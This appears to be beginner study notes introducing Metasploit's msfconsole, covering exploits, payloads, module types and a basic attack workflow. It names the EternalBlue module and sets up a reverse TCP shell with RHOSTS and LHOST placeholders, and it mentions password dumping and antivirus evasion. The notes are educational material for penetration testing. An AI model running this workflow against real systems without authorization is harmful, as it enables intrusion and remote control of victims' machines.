# Metasploit: Itroduction

## 1️⃣ What is `msfconsole`?

- `msfconsole` is **the main Metasploit app**
- You type **all commands here**
- Everything you do (scan, exploit, get a shell) happens inside it

👉 **Always start with:**

```bash
msfconsole

```

---

## 2️⃣ Three MUST-KNOW words (very important)

### 🔴 Vulnerability

A **weakness** in a system

Example: outdated software, bad configuration

### 🔴 Exploit

The **tool/code** that uses the vulnerability

Example: “This exploit abuses that old version”

### 🔴 Payload

What **runs after the exploit works**

Example:

- open a shell
- run a command
- open calculator (proof)

🧠 **Simple flow:**

```
Vulnerability → Exploit → Payload → Access

```

---

## 3️⃣ What are Metasploit Modules?

Modules are **small tools**, each does **one job**.

You don’t need to memorize folders — just know **what each type does**.

---

## 4️⃣ The MOST IMPORTANT module types (focus here)

### 🔹 Exploits (⭐ VERY IMPORTANT)

- Used to **break into** a system
- Organized by OS (windows, linux, android…)

Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue

```

---

### 🔹 Payloads (⭐ VERY IMPORTANT)

- What you **get after exploitation**
- Usually a **shell**

Common goal:

👉 **Reverse shell** (target connects back to you)

Examples:

```
windows/x64/shell/reverse_tcp   (staged)
generic/shell_reverse_tcp      (single)

```

🧠 `_` = single payload

🧠 `/` = staged payload

---

### 🔹 Auxiliary (Scanning & enumeration)

- **No hacking yet**
- Used to:
    - scan ports
    - find services
    - brute-force logins

Example:

```bash
use auxiliary/scanner/portscan/tcp

```

---

### 🔹 Post (After you already hacked)

- Used **after you get a shell**
- Things like:
    - dump passwords
    - get system info
    - pivot to other machines

---

## 5️⃣ Payload types (simple explanation)

### ✔ Singles

- All-in-one
- Bigger size
- More reliable

### ✔ Staged

- Small first payload → downloads the rest
- Faster & stealthier
- Needs **stager + stage**

👉 Beginners usually start with **staged payloads**

---

## 6️⃣ Encoders / Evasion (DON’T WORRY TOO MUCH)

- Used to **avoid antivirus**
- Not important for beginners
- You can ignore this for now ❌

---

## 7️⃣ What you ACTUALLY do as a beginner

**Basic Metasploit workflow:**

```
1. Scan target (auxiliary)
2. Find vulnerability
3. Use exploit
4. Set payload
5. Get shell 🎉

```

Example flow:

```bash
use exploit/...
set RHOSTS target_ip
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST your_ip
run

```

---

## 8️⃣ One sentence summary (remember this)

> Metasploit = exploits vulnerabilities to run payloads and get access
>